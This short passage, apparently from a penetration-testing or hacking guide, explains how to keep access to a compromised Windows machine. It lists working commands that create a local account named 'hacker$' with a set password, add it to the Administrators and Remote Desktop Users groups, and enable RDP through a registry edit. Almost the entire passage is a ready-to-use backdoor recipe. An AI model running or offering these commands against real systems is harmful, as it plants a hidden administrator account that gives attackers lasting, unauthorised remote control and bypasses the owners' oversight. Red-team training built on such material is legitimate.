If we have a SYSTEM shell or we are an Administrator we can establish persistence for easier access:

**Create a new user:**

```
net user hacker$ P@ssw0rd123 /add
```

**Add it to the administrators group:**

```
net localgroup Administrators hacker$ /add
```

**Add it to the RDP group:**

```
net localgroup "Remote Desktop Users" hacker$ /add
```

**Enable RDP for GUI access:**

```
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

Now we can RDP into the machine as a local administrator.